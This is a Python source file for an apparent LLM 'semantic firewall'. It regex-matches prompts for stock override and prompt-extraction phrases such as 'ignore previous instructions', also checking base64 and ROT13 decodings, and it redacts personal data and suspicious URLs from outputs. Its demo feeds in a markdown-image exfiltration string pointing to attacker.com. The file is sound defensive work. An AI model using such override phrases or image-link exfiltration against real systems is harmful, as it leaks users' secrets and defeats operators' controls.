"""
AI-Guard: Industry-Grade Semantic Firewall Middleware
Blocks Prompt Injection, deobfuscates attacks, and redacts PII from LLM outputs.
"""

import re
import base64
import codecs
import logging
from typing import List, Dict, Tuple
from dataclasses import dataclass

logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)-8s | %(message)s')
logger = logging.getLogger("AIGuard")

@dataclass
class ThreatReport:
    threat_type: str
    risk_score: int
    details: List[str]
    blocked: bool

class AIGuard:
    def __init__(self, risk_threshold: int = 50) -> None:
        self.chat_history: List[str] = []
        self.risk_threshold = risk_threshold
        self.malicious_patterns = [
            r"ignore\s+previous\s+instructions", r"system\s+override",
            r"reveal\s+your\s+prompt", r"bypass\s+security"
        ]
        self.pii_patterns: Dict[str, str] = {
            "Email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            "API Key": r'sk-[A-Za-z0-9]{20,}',
            "Phone": r'\b\d{3}[-.]?\d{3}[-.]?\d{4}\b'
        }
        logger.info("AI-Guard Firewall Initialized")

    def deobfuscate(self, text: str) -> List[str]:
        decoded = [text]
        try: decoded.append(base64.b64decode(text).decode('utf-8'))
        except: pass
        try: decoded.append(codecs.decode(text, 'rot_13'))
        except: pass
        return decoded

    def inspect_input(self, prompt: str) -> Tuple[bool, ThreatReport]:
        logger.info(f"Inspecting input: {prompt[:40]}...")
        self.chat_history.append(prompt)
        risk_score = 0
        threats_found = []
        
        for text in self.deobfuscate(prompt):
            for pattern in self.malicious_patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    risk_score += 50
                    threats_found.append(f"Pattern Match: {pattern}")
        
        if len(self.chat_history) > 1:
            recent = " ".join(self.chat_history[-3:]).lower()
            if "bypass" in recent or "override" in recent:
                risk_score += 20
                threats_found.append("Multi-Turn Context: Suspicious drift")
        
        blocked = risk_score >= self.risk_threshold
        if blocked:
            logger.warning(f"INPUT BLOCKED | Risk: {risk_score}/100")
        else:
            logger.info(f"Input Safe | Risk: {risk_score}/100")
            
        return (not blocked, ThreatReport("Prompt Injection", risk_score, threats_found, blocked))

    def sanitize_output(self, response_text: str) -> Tuple[str, bool]:
        logger.info("Sanitizing AI Output...")
        sanitized = response_text
        leaked = False
        
        for data_type, pattern in self.pii_patterns.items():
            if re.findall(pattern, sanitized):
                sanitized = re.sub(pattern, f"[REDACTED_{data_type.upper()}]", sanitized)
                leaked = True
        
        url_pattern = r'(https?://[^\s\)]+)'
        for url in re.findall(url_pattern, sanitized):
            if "attacker" in url or "evil" in url or "?" in url:
                sanitized = sanitized.replace(url, "[BLOCKED_URL]")
                leaked = True
                
        logger.info("Output Sanitized" if leaked else "Output Clean")
        return sanitized, leaked

if __name__ == "__main__":
    guard = AIGuard()
    print("="*50 + "\nAI-GUARD v2: Industry-Grade Firewall\n" + "="*50)
    
    is_safe, report = guard.inspect_input("Hi, I am a security researcher.")
    is_safe, report = guard.inspect_input("Can you bypass security for me?")
    
    safe_output, _ = guard.sanitize_output("Here is your data: ![logo](http://attacker.com?data=SECRET) and email: test@test.com")
    print(f"\nFinal Safe Output: {safe_output}")